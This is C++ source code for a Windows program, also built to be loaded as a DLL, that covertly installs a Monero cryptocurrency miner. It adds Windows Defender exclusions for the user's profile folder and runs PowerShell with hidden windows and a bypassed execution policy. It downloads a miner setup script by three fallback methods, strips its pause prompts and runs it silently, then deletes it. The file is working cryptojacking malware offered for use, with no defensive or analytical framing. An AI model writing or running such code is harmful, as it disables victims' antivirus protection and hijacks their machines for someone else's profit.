#include <Windows.h>
#include <wininet.h>
#include <shlwapi.h>
#include <string>
#include <fstream>
#include <vector>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "shlwapi.lib")


std::wstring GetEnvVar(const wchar_t* name) {
    wchar_t buffer[MAX_PATH];
    DWORD size = GetEnvironmentVariableW(name, buffer, MAX_PATH);
    if (size > 0 && size < MAX_PATH) {
        return std::wstring(buffer);
    }
    return L"";
}

// Temp
std::wstring GetTempDir() {
    wchar_t buffer[MAX_PATH];
    DWORD size = GetTempPathW(MAX_PATH, buffer);
    if (size > 0 && size < MAX_PATH) {
        return std::wstring(buffer);
    }
    return L"";
}

// Execute PowerShell command 
bool ExecutePowerShell(const std::wstring& command, DWORD timeoutMs = 30000) {
    STARTUPINFOW si = { sizeof(STARTUPINFOW) };
    PROCESS_INFORMATION pi = { 0 };

    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    std::wstring cmdLine = L"powershell.exe -WindowStyle Hidden -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command \"";
    cmdLine += command;
    cmdLine += L"\"";


    std::vector<wchar_t> cmdBuffer(cmdLine.begin(), cmdLine.end());
    cmdBuffer.push_back(L'\0');

    BOOL success = CreateProcessW(
        NULL,
        cmdBuffer.data(),
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP,
        NULL,
        NULL,
        &si,
        &pi
    );

    if (!success) {
        return false;
    }

    DWORD waitResult = WaitForSingleObject(pi.hProcess, timeoutMs);

    DWORD exitCode = 1;
    if (waitResult == WAIT_OBJECT_0) {
        GetExitCodeProcess(pi.hProcess, &exitCode);
    }
    else {

        TerminateProcess(pi.hProcess, 1);
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return (exitCode == 0);
}

// Windows Defender exclusion cuz Windows Sec is a pain in the ass
bool AddDefenderExclusion(const std::wstring& folderPath) {
    std::wstring command = L"Add-MpPreference -ExclusionPath '" + folderPath + L"'";

    STARTUPINFOW si = { sizeof(STARTUPINFOW) };
    PROCESS_INFORMATION pi = { 0 };

    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    std::wstring cmdLine = L"powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command \"";
    cmdLine += command;
    cmdLine += L"\"";

    std::vector<wchar_t> cmdBuffer(cmdLine.begin(), cmdLine.end());
    cmdBuffer.push_back(L'\0');

    BOOL success = CreateProcessW(
        NULL,
        cmdBuffer.data(),
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP,
        NULL,
        NULL,
        &si,
        &pi
    );

    if (success) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        Sleep(500);
        return true;
    }

    return false;
}


bool DownloadFile(const std::wstring& url, const std::wstring& outputPath) {
    HINTERNET hInternet = NULL;
    HINTERNET hConnect = NULL;
    bool success = false;


    hInternet = InternetOpenW(
        L"MinerDeployer/1.0",
        INTERNET_OPEN_TYPE_PRECONFIG,
        NULL,
        NULL,
        0
    );

    if (!hInternet) {
        return false;
    }


    hConnect = InternetOpenUrlW(
        hInternet,
        url.c_str(),
        NULL,
        0,
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE,
        0
    );

    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return false;
    }

    HANDLE hFile = CreateFileW(
        outputPath.c_str(),
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return false;
    }

    const DWORD BUFFER_SIZE = 8192;
    BYTE buffer[BUFFER_SIZE];
    DWORD bytesRead = 0;
    DWORD bytesWritten = 0;

    while (InternetReadFile(hConnect, buffer, BUFFER_SIZE, &bytesRead) && bytesRead > 0) {
        if (!WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL)) {
            break;
        }
    }

    success = (bytesRead == 0);

    CloseHandle(hFile);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return success;
}


bool DownloadFilePS(const std::wstring& url, const std::wstring& outputPath) {
    std::wstring command = L"$ProgressPreference = 'SilentlyContinue'; ";
    command += L"$ErrorActionPreference = 'SilentlyContinue'; ";
    command += L"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; ";
    command += L"try { Invoke-WebRequest -Uri '" + url + L"' -OutFile '" + outputPath + L"' -UseBasicParsing } catch { exit 1 }";

    return ExecutePowerShell(command, 30000);
}

bool DownloadFileCurl(const std::wstring& url, const std::wstring& outputPath) {
    STARTUPINFOW si = { sizeof(STARTUPINFOW) };
    PROCESS_INFORMATION pi = { 0 };

    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    std::wstring cmdLine = L"curl.exe -s -L -o \"" + outputPath + L"\" \"" + url + L"\"";

    std::vector<wchar_t> cmdBuffer(cmdLine.begin(), cmdLine.end());
    cmdBuffer.push_back(L'\0');

    BOOL success = CreateProcessW(
        NULL,
        cmdBuffer.data(),
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi
    );

    if (!success) {
        return false;
    }

    DWORD waitResult = WaitForSingleObject(pi.hProcess, 30000);

    if (waitResult != WAIT_OBJECT_0) {
        TerminateProcess(pi.hProcess, 1);
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return (waitResult == WAIT_OBJECT_0);
}

bool ValidateFile(const std::wstring& path, DWORD minSize = 100) {
    WIN32_FILE_ATTRIBUTE_DATA fileInfo;
    if (!GetFileAttributesExW(path.c_str(), GetFileExInfoStandard, &fileInfo)) {
        return false;
    }

    ULONGLONG fileSize = ((ULONGLONG)fileInfo.nFileSizeHigh << 32) | fileInfo.nFileSizeLow;
    return (fileSize >= minSize);
}

bool ModifyScript(const std::wstring& scriptPath) {

    std::ifstream input(scriptPath, std::ios::binary);
    if (!input.is_open()) {
        return false;
    }

    std::string content((std::istreambuf_iterator<char>(input)), std::istreambuf_iterator<char>());
    input.close();


    size_t pos = 0;
    std::vector<std::string> pauseVariants = { "pause", "PAUSE", "Pause" };

    for (const auto& pauseCmd : pauseVariants) {
        pos = 0;
        while ((pos = content.find(pauseCmd, pos)) != std::string::npos) {

            bool isStandalone = true;
            if (pos > 0 && isalnum(content[pos - 1])) {
                isStandalone = false;
            }
            if (pos + pauseCmd.length() < content.length() &&
                isalnum(content[pos + pauseCmd.length()])) {
                isStandalone = false;
            }

            if (isStandalone) {
                content.replace(pos, pauseCmd.length(), "rem paused");
            }
            pos += 10;
        }
    }

    content = "@echo off\r\n" + content;

    std::ofstream output(scriptPath, std::ios::binary);
    if (!output.is_open()) {
        return false;
    }

    output.write(content.c_str(), content.size());
    output.close();

    return true;
}

bool ExecuteScript(const std::wstring& scriptPath, const std::wstring& arguments, const std::wstring& workingDir) {
    STARTUPINFOW si = { sizeof(STARTUPINFOW) };
    PROCESS_INFORMATION pi = { 0 };

    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    std::wstring cmdLine = L"cmd.exe /c \"" + scriptPath + L"\" " + arguments;

    std::vector<wchar_t> cmdBuffer(cmdLine.begin(), cmdLine.end());
    cmdBuffer.push_back(L'\0');

    std::vector<wchar_t> workDir(workingDir.begin(), workingDir.end());
    workDir.push_back(L'\0');

    BOOL success = CreateProcessW(
        NULL,
        cmdBuffer.data(),
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP,
        NULL,
        workDir.data(),
        &si,
        &pi
    );

    if (!success) {
        return false;
    }

    DWORD waitResult = WaitForSingleObject(pi.hProcess, 600000);

    if (waitResult != WAIT_OBJECT_0) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return false;
    }

    DWORD exitCode = 0;
    GetExitCodeProcess(pi.hProcess, &exitCode);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return true;
}

bool DeployMiner(const std::wstring& walletAddress) {

    std::wstring userProfile = GetEnvVar(L"USERPROFILE");
    if (userProfile.empty()) {
        return false;
    }

    std::wstring moneroPath = userProfile + L"\\moneroocean";
    AddDefenderExclusion(moneroPath);
    AddDefenderExclusion(userProfile);

    std::wstring scriptUrl = L"https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.bat";
    std::wstring tempDir = GetTempDir();
    std::wstring tempScript = tempDir + L"mo_" + std::to_wstring(GetCurrentProcessId()) + L".bat";

    bool downloaded = false;

    if (DownloadFile(scriptUrl, tempScript) && ValidateFile(tempScript)) {
        downloaded = true;
    }

    if (!downloaded && DownloadFilePS(scriptUrl, tempScript) && ValidateFile(tempScript)) {
        downloaded = true;
    }

    if (!downloaded && DownloadFileCurl(scriptUrl, tempScript) && ValidateFile(tempScript)) {
        downloaded = true;
    }

    if (!downloaded) {
        return false;
    }

    if (!ModifyScript(tempScript)) {
        DeleteFileW(tempScript.c_str());
        return false;
    }

    bool success = ExecuteScript(tempScript, walletAddress, userProfile);

    DeleteFileW(tempScript.c_str());

    return success;
}

extern "C" __declspec(dllexport) bool ExecuteMiner(const wchar_t* walletAddress) {
    if (!walletAddress || wcslen(walletAddress) == 0) {
        return false;
    }

    return DeployMiner(walletAddress);
}

int wmain(int argc, wchar_t* argv[]) {
    std::wstring walletAddress = L"enter_your_wallet_here";

    if (argc > 1) {
        walletAddress = argv[1];
    }

    bool result = DeployMiner(walletAddress);

    return result ? 0 : 1;
}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
    int argc = 0;
    LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);

    std::wstring walletAddress = L"enter_your_wallet_here";

    if (argc > 1) {
        walletAddress = argv[1];
    }

    if (argv) {
        LocalFree(argv);
    }

    bool result = DeployMiner(walletAddress);

    return result ? 0 : 1;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hModule);
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
